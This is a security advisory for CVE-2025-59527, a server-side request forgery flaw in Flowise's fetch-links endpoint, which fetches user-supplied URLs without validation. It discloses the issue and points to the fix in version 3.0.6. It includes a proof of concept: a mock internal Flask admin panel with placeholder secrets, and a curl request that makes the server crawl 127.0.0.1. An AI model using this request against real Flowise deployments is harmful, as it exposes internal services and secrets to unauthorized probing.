# [H] FlowiseAI/Flowise has Server-Side Request Forgery (SSRF) vulnerability

## Summary
Severity: High
Advisory: GHSA-hr92-4q35-4j3m
CVE: CVE-2025-59527
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-09-15
Source: https://github.com/advisories/GHSA-hr92-4q35-4j3m
Type: github-advisory

## Affected
- npm: `flowise` — affected >=3.0.5 <3.0.6

## Details
### Summary
---

A Server-Side Request Forgery (SSRF) vulnerability was discovered in the `/api/v1/fetch-links` endpoint of the Flowise application. This vulnerability allows an attacker to use the Flowise server as a proxy to access internal network web services and explore their link structures. The impact includes the potential exposure of sensitive internal administrative endpoints.


### Details
---

#### Vulnerability Overview

The `fetch-links` feature in Flowise is designed to extract links from external websites or XML sitemaps. It performs an HTTP request from the server to the user-supplied URL and parses the response (HTML or XML) to extract and return links.

The issue arises because the feature performs these HTTP requests **without validating the user-supplied URL**. In particular, when the `relativeLinksMethod` parameter is set to `webCrawl` or `xmlScrape`, the server directly calls the `fetch()` function with the provided URL, making it vulnerable to SSRF attacks.

#### Root Cause

The `fetch()` function is called without URL validation or restriction, which enables attackers to redirect the server to internal services.


### Taint Flow

#### • Taint 01: Route Registration

https://github.com/FlowiseAI/Flowise/blob/5930f1119c655bcf8d2200ae827a1f5b9fec81d0/packages/server/src/controllers/fetch-links/index.ts#L6-L24

#### • Taint 02: Service

https://github.com/FlowiseAI/Flowise/blob/5930f1119c655bcf8d2200ae827a1f5b9fec81d0/packages/server/src/services/fetch-links/index.ts#L8-L18

#### • Taint 03: xmlScrape

https://github.com/FlowiseAI/Flowise/blob/5930f1119c655bcf8d2200ae827a1f5b9fec81d0/packages/components/src/utils.ts#L474-L478


### PoC
---

#### PoC Description

This vulnerability was verified in a local development environment. The Flowise server was running at `http://localhost:3000`, and authentication was performed using the Bearer token:

```
tmY1fIjgqZ6-nWUuZ9G7VzDtlsOiSZlDZjFSxZrDd0Q
```

Upon a successful attack, the Flowise server returned the entire link structure of the internal admin panel in JSON format. The response included sensitive administrative URLs such as:

- `/api/users` (User Management)
- `/api/secrets` (API Keys)
- `/api/database` (Database Config)

This demonstrated that an attacker could enumerate internal web service structures.

#### Internal Admin Server (Mock)

```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def admin():
    return render_template_string("""
    <html>
    <h1>Internal Admin Panel</h1>
    <ul>
        <li><a href="/api/users">User Management</a></li>
        <li><a href="/api/secrets">API Keys</a></li>
        <li><a href="/api/database">Database Config</a></li>
        <li><a href="/api/logs">System Logs</a></li>
    </ul>
    """)

@app.route('/api/users')
def users():
    return render_template_string("""
    <html>
    <h1>Users</h1>
    <ul>
        <li><a href="/api/users/admin">admin (root)</a></li>
        <li><a href="/api/users/operator">operator</a></li>
    </ul>
    <a href="/">Back</a>
    """)

@app.route('/api/secrets')
def secrets():
    return render_template_string("""
    <html>
    <h1>Secrets</h1>
    <ul>
        <li><a href="/api/secrets/db_key">DB Key: sk-1234567890abcdef</a></li>
        <li><a href="/api/secrets/aws_key">AWS Key: AKIAIOSFODNN7EXAMPLE</a></li>
    </ul>
    <a href="/">Back</a>
    """)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080)
```

#### curl Request Example

```bash
curl -G 'http://localhost:3000/api/v1/fetch-links' \
     --data-urlencode 'url=http://127.0.0.1:8080/' \
     --data-urlencode 'relativeLinksMethod=webCrawl' \
     --data-urlencode 'limit=10' \
     -H 'Authorization: Bearer tmY1fIjgqZ6-nWUuZ9G7VzDtlsOiSZlDZjFSxZrDd0Q' \
     -s | jq '.'
```
<img width="1914" height="952" alt="image" src="https://github.com/user-attachments/assets/6cb1abb1-0a31-43d4-8d9e-8d45f58051f3" />


### Impact
---

This is a **Server-Side Request Forgery (SSRF)** vulnerability.

- **Who is impacted?** Any user running Flowise server exposed to external traffic.
- **Risk:** Attackers can leverage the Flowise server to:
  - Explore internal web applications
  - Bypass firewall rules
  - Access sensitive administrative interfaces
  - Leak internal configuration, credentials, or secrets

This vulnerability significantly increases the risk of **internal service enumeration and potential lateral movement** in an enterprise environment.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-hr92-4q35-4j3m
- https://nvd.nist.gov/vuln/detail/CVE-2025-59527
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/blob/5930f1119c655bcf8d2200ae827a1f5b9fec81d0/packages/components/src/utils.ts#L474-L478
- https://github.com/FlowiseAI/Flowise/blob/5930f1119c655bcf8d2200ae827a1f5b9fec81d0/packages/server/src/controllers/fetch-links/index.ts#L6-L24
- https://github.com/FlowiseAI/Flowise/blob/5930f1119c655bcf8d2200ae827a1f5b9fec81d0/packages/server/src/services/fetch-links/index.ts#L8-L18
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.6
